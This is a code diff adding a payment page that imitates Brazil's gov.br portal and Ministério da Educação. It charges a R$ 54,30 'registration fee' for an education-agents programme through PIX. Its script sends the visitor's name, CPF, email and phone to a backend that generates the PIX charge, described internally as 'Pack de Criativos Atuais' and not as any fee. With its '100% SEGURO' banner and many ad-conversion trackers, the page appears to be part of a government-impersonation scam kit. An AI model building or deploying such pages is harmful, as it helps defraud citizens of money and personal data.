@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body class="bg-white">
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX - Mais Agentes da Educação</title>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17263154069"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'AW-17263154069');
+        gtag('config', 'AW-17263148723');
+        gtag('config', 'AW-17263158575');
+        gtag('config', 'AW-17261245517');
+        gtag('config', 'AW-17261184359');
+        gtag('config', 'AW-17263086362');
+        gtag('config', 'AW-17263093268');
+        gtag('config', 'AW-17257933509');
+        gtag('config', 'AW-17190997973');
+        gtag('config', 'AW-17257816632');
+    </script>
+
+
+
+
+    <script src="3.4-5.16"></script>
+    <link rel="stylesheet" href="css/all.min-5.css">
+    <link href="rawline-5" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/custom-5.css">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon"
+        href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
+
+
+
+    <!-- Header -->
+    <header class="header-govbr">
+        <div class="flex justify-between items-center px-4 py-3">
+            <div class="flex items-center">
+                <a href="/" class="gov-logo">
+                    <img src="images/1200px-Gov.br_logo.svg-5.png" alt="gov.br" class="h-8">
+                </a>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="menu-btn" aria-label="Menu">
+                    <i class="fas fa-ellipsis-v text-blue-900 mx-3"></i>
+                </button>
+                <div class="w-px h-6 bg-blue-900 mx-3"></div>
+                <button class="header-btn" id="accessibility-btn" aria-label="Acessibilidade">
+                    <i class="fas fa-palette text-blue-900 mx-3"></i>
+                </button>
+                <div class="half-circle mx-3"></div>
+                <button class="header-btn" id="apps-btn" aria-label="Aplicativos">
+                    <i class="fas fa-th text-blue-900 mx-3"></i>
+                </button>
+                <a href="/login"
+                    class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
+                    <i class="fas fa-user mr-2"></i>
+                    <span id="user-name-header">Entrar</span>
+                </a>
+            </div>
+        </div>
+
+        <!-- Title Bar -->
+        <div class="flex justify-between items-center px-4 py-2 border-b border-gray-300">
+            <div class="flex items-center">
+                <button class="header-btn" id="sidebar-toggle" aria-label="Menu lateral">
+                    <i class="fas fa-bars text-blue-900 mr-3"></i>
+                </button>
+                <span class="text-gray-800 text-sm font-medium">Ministério da Educação</span>
+            </div>
+            <div class="flex items-center">
+                <div class="flex flex-col items-center text-green-800 font-bold text-sm">
+                    <div class="flex items-center">
+                        <i class="fas fa-shield-alt mr-2"></i>
+                        PAGAMENTO
+                    </div>
+                    <div>100% SEGURO</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Search Bar (hidden by default) -->
+        <div id="search-bar" class="hidden bg-white border-b border-gray-300 px-4 py-3">
+            <div class="flex items-center max-w-md mx-auto">
+                <div class="relative flex-1">
+                    <input type="text" id="header-search-input" placeholder="Buscar programas, vagas, ministérios..."
+                        class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200">
+                    <button id="header-search-btn" class="absolute right-2 top-2 text-blue-600 hover:text-blue-800">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </div>
+                <button id="search-close-btn" class="ml-3 text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container mx-auto max-w-4xl">
+        <div class="px-4 py-4">
+            <h1 class="text-3xl font-semibold mb-4 text-black flex items-center">
+                <img src="images/simbolo.jpg" alt="Logo" class="h-12 w-12 mr-3">
+                Taxa de Inscrição
+            </h1>
+
+            <div class="border-t border-b border-gray-300 py-3 mb-6">
+                <div class="text-gray-700 text-sm">
+                    <p>Gerado em <span id="data-geracao"></span></p>
+                    <p>Valor: <strong>R$ 54,30</strong></p>
+                </div>
+            </div>
+
+            <!-- Dados do Usuário -->
+            <div class="bg-white border border-gray-200 rounded-lg mb-6">
+                <button id="toggle-dados-btn"
+                    class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-blue-100 transition-colors rounded-t-lg bg-blue-50 border-b border-blue-200"
+                    onclick="toggleDadosUsuario()">
+                    <h2 class="text-xl font-semibold text-blue-800">Dados do Inscrito:</h2>
+                    <i id="toggle-icon" class="fas fa-chevron-down text-blue-600 transition-transform"></i>
+                </button>
+
+                <div id="dados-usuario-content" class="hidden px-6 pb-6">
+                    <div class="grid md:grid-cols-2 gap-4 mb-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-1">Nome Completo</label>
+                            <input type="text" id="nome-usuario" readonly=""
+                                class="w-full px-3 py-2 border border-gray-300 rounded-md bg-gray-50">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-1">CPF</label>
+                            <input type="text" id="cpf-usuario" readonly=""
+                                class="w-full px-3 py-2 border border-gray-300 rounded-md bg-gray-50">
+                        </div>
+                    </div>
+
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium text-gray-700 mb-1">Email *</label>
+                        <input type="email" id="email-usuario" readonly=""
+                            class="w-full px-3 py-2 border border-gray-300 rounded-md bg-gray-50"
+                            placeholder="seu@email.com">
+                    </div>
+
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
+                        <input type="tel" id="telefone-usuario" readonly=""
+                            class="w-full px-3 py-2 border border-gray-300 rounded-md bg-gray-50"
+                            placeholder="(11) 99999-9999">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Informações do Pagamento -->
+            <div class="bg-white border border-gray-200 rounded-lg p-6 mb-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-4">
+                    <i class="fas fa-qrcode mr-2" style="color: #1351B4;"></i>
+                    Pagamento via PIX
+                </h2>
+
+                <div class="grid md:grid-cols-2 gap-6">
+                    <!-- QR Code -->
+                    <div class="text-center">
+                        <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
+                            <div id="qr-code-container" class="flex items-center justify-center h-64">
+                                <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
+                                <span class="ml-2 text-gray-600">Gerando QR Code...</span>
+                            </div>
+                        </div>
+                        <p class="text-sm text-gray-600">Escaneie o código com o app do seu banco</p>
+                    </div>
+
+                    <!-- Código PIX -->
+                    <div>
+                        <h3 class="font-semibold text-gray-800 mb-3">Código PIX Copia e Cola</h3>
+                        <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
+                            <textarea id="pix-code" readonly=""
+                                class="w-full h-32 text-xs font-mono bg-transparent border-none resize-none focus:outline-none"
+                                placeholder="Gerando código PIX..."></textarea>
+                        </div>
+                        <button id="copy-pix-btn"
+                            class="w-full bg-blue-600 text-white py-2 px-4 rounded font-medium hover:bg-blue-700 transition-colors">
+                            <i class="fas fa-copy mr-2"></i>
+                            Copiar Código PIX
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Status do Pagamento -->
+            <div class="bg-white border border-gray-200 rounded-lg p-6 mb-6">
+                <h3 class="font-semibold text-gray-800 mb-4">Status do Pagamento</h3>
+
+                <div id="payment-status" class="flex items-center p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
+                    <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-yellow-600 mr-3"></div>
+                    <span class="text-yellow-800">Aguardando pagamento...</span>
+                </div>
+
+                <button id="verify-payment-btn"
+                    class="mt-4 bg-green-600 text-white py-2 px-6 rounded font-medium hover:bg-green-700 transition-colors">
+                    <i class="fas fa-check-circle mr-2"></i>
+                    Verificar Pagamento
+                </button>
+            </div>
+
+            <!-- Informações Importantes -->
+            <div class="bg-blue-50 border border-blue-200 rounded-lg p-6">
+                <h3 class="font-semibold text-blue-800 mb-3">
+                    <i class="fas fa-info-circle mr-2"></i>
+                    Informações Importantes
+                </h3>
+                <ul class="text-sm text-blue-700 space-y-2">
+                    <li>• O pagamento via PIX é processado instantaneamente</li>
+                    <li>• Após a confirmação, você receberá o comprovante por email</li>
+                    <li>• O código PIX tem validade de 2 horas</li>
+                    <li>• Em caso de problemas, entre em contato pelo suporte</li>
+                    <li>• Taxa de inscrição: R$ 54,30</li>
+                </ul>
+            </div>
+        </div>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+        <script>
+            const prefixo = '1'
+            const agora = Date.now()
+            const pixCodeSalvo = localStorage.getItem(`pixcode${prefixo}`)
+            const qrCodeSalvo = localStorage.getItem(`qrcode${prefixo}`)
+            const pixExpiracao = localStorage.getItem(`pixexp${prefixo}`)
+
+            if (pixCodeSalvo && qrCodeSalvo && pixExpiracao && agora < parseInt(pixExpiracao)) {
+                document.getElementById('pix-code').value = pixCodeSalvo
+                document.getElementById('qr-code-container').innerHTML = ''
+                new QRCode(document.getElementById("qr-code-container"), pixCodeSalvo)
+            } else {
+                const dadosPagamento = {
+                    valor: 54.30,
+                    descricao: 'Pack de Criativos Atuais',
+                    nome_pagador: localStorage.getItem('dadosCpfValidado') ? JSON.parse(localStorage.getItem('dadosCpfValidado')).nome : '',
+                    cpf_pagador: localStorage.getItem('dadosCpfValidado') ? JSON.parse(localStorage.getItem('dadosCpfValidado')).cpf : '',
+                    email_pagador: localStorage.getItem('emailUsuario') || '',
+                    telefone_pagador: localStorage.getItem('telefoneUsuario') || ''
+                }
+
+                fetch('gerar.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        nome_pagador: dadosPagamento.nome_pagador,
+                        cpf_pagador: dadosPagamento.cpf_pagador,
+                        email_pagador: dadosPagamento.email_pagador,
+                        telefone_pagador: dadosPagamento.telefone_pagador,
+                        descricao: dadosPagamento.descricao,
+                        valor_pagamento: Math.round(dadosPagamento.valor * 100)
+                    })
+                })
+                    .then(res => res.json())
+                    .then(res => {
+                        if (res.success) {
+                            const validade24h = agora + 24 * 60 * 60 * 1000
+                            localStorage.setItem(`pixcode${prefixo}`, res.pixCode)
+                            localStorage.setItem(`qrcode${prefixo}`, res.pixCode)
+                            localStorage.setItem(`pixexp${prefixo}`, validade24h.toString())
+
+                            document.getElementById('pix-code').value = res.pixCode
+                            document.getElementById('qr-code-container').innerHTML = ''
+                            new QRCode(document.getElementById("qr-code-container"), res.pixCode)
+
+                            const transacaoId = res.transacao_id
+
+                            const verificarPagamento = () => {
+                                fetch(`status.php?id=${transacaoId}`)
+                                    .then(resp => resp.json())
+                                    .then(statusData => {
+                                        if (statusData.success && statusData.status === 'APPROVED') {
+                                            document.getElementById('payment-status').innerHTML = `
+                                    <div class="flex items-center p-4 bg-green-100 border border-green-300 rounded-lg">
+                                        <i class="fas fa-check-circle text-green-700 mr-2"></i>
+                                        <span class="text-green-800">Pagamento confirmado com sucesso!</span>
+                                    </div>
+                                `
+                                            clearInterval(intervaloVerificacao)
+
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17263154069/DnnBCOeLhuIaEJWn26dA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17263148723/LSE2CPbzk-IaELP92qdA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17263158575/cFLXCK7flOIaEK_K26dA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17261245517/fNtWCP-sw-EaEM3o5qZA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17261184359/S2MYCJjKyeEaEOeK46ZA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17263086362/6xYHCNvw_-EaEJqW16dA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17263093268/pOKUCLvNleIaEJTM16dA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17257933509/FX1ICLGVieMaEMXVnKVA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17190997973/TJHmCM2f1twaENWfp4VA' })
+                                            gtag('event', 'conversion', { 'send_to': 'AW-17257816632/_7T2CPqr8-IaELjElaVA' })
+
+                                            setTimeout(() => {
+                                                window.location.href = '../pagamento-confirmado'
+                                            }, 2000)
+                                        }
+                                    })
+                                    .catch(err => console.error('Erro ao verificar status:', err))
+                            }
+
+                            const intervaloVerificacao = setInterval(verificarPagamento, 3000)
+                        } else {
+                            alert('Erro ao gerar pagamento PIX')
+                            console.log(res)
+                        }
+                    })
+            }
+
+            document.getElementById('copy-pix-btn').addEventListener('click', () => {
+                const textarea = document.getElementById('pix-code')
+                textarea.select()
+                document.execCommand('copy')
+                alert('Código PIX copiado!')
+            })
+        </script>
+
+
+
+
+</body>
+
+</html>
